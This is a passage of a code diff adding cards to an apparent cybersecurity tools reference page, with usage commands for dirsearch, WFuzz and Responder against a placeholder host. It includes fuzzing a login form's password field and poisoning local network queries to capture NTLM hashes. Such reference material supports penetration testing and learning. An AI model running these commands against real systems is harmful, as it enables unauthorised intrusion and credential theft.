+# Use custom wordlist
+python3 dirsearch.py -u "http://target.com" -w /path/to/wordlist.txt`}
                     </pre>
+                    <CopyButton text={`# Basic directory scan\npython3 dirsearch.py -u "http://target.com"\n\n# Scan with extensions\npython3 dirsearch.py -u "http://target.com" -e php,html,txt\n\n# Use custom wordlist\npython3 dirsearch.py -u "http://target.com" -w /path/to/wordlist.txt`} copiedText={copiedText} onCopy={handleCopy} />
+                  </div>
+                </div>
+              </div>
+
+              <div className="col-md-6 col-lg-4">
+                <div className="cyber-card p-4 h-100 d-flex flex-column">
+                  <i className="fa-brands fa-python text-primary fa-2x mb-3"></i>
+                  <h4 className="text-primary">WFuzz <span className="fs-6 text-secondary ms-2">{'{Python}'}</span></h4>
+                  <p className="text-secondary"><strong className="text-primary">What it is:</strong> A highly configurable web application fuzzer.</p>
+                  <p className="text-secondary flex-grow-1"><strong className="text-primary">How it's used:</strong> Used to find unlinked resources, hidden directories, or inject payloads into URL parameters and headers.</p>
+                  <div className="d-flex align-items-start bg-dark p-3 rounded border border-primary border-opacity-25 mt-3">
+                    <pre className="text-primary mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
+{`# Fuzz URL directory
+wfuzz -c -z file,wordlist.txt --hc 404 http://target.com/FUZZ
+
+# Fuzz GET parameters
+wfuzz -c -z file,params.txt http://target.com/index.php?FUZZ=1
+
+# Fuzz POST data
+wfuzz -c -z file,payloads.txt -d "user=admin&pass=FUZZ" http://target.com/login.php`}
+                    </pre>
+                    <CopyButton text={`# Fuzz URL directory\nwfuzz -c -z file,wordlist.txt --hc 404 http://target.com/FUZZ\n\n# Fuzz GET parameters\nwfuzz -c -z file,params.txt http://target.com/index.php?FUZZ=1\n\n# Fuzz POST data\nwfuzz -c -z file,payloads.txt -d "user=admin&pass=FUZZ" http://target.com/login.php`} copiedText={copiedText} onCopy={handleCopy} />
+                  </div>
+                </div>
+              </div>
+
+              <div className="col-md-6 col-lg-4">
+                <div className="cyber-card p-4 h-100 d-flex flex-column">
+                  <i className="fa-brands fa-python text-light fa-2x mb-3"></i>
+                  <h4 className="text-light">Responder <span className="fs-6 text-secondary ms-2">{'{Python}'}</span></h4>
+                  <p className="text-secondary"><strong className="text-light">What it is:</strong> A powerful LLMNR, NBT-NS and MDNS poisoner.</p>
+                  <p className="text-secondary flex-grow-1"><strong className="text-light">How it's used:</strong> It answers to specific local network queries, tricking devices into sending it NTLM authentication hashes which can then be cracked.</p>
+                  <div className="d-flex align-items-start bg-dark p-3 rounded border border-light border-opacity-25 mt-3">
+                    <pre className="text-light mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
+{`# Start listening on eth0
+python3 Responder.py -I eth0
+
+# Run in analyze mode (no poisoning)
+python3 Responder.py -I eth0 -A`}
+                    </pre>
+                    <CopyButton text={`# Start listening on eth0\npython3 Responder.py -I eth0\n\n# Run in analyze mode (no poisoning)\npython3 Responder.py -I eth0 -A`} copiedText={copiedText} onCopy={handleCopy} />
                   </div>
                 </div>
               </div>
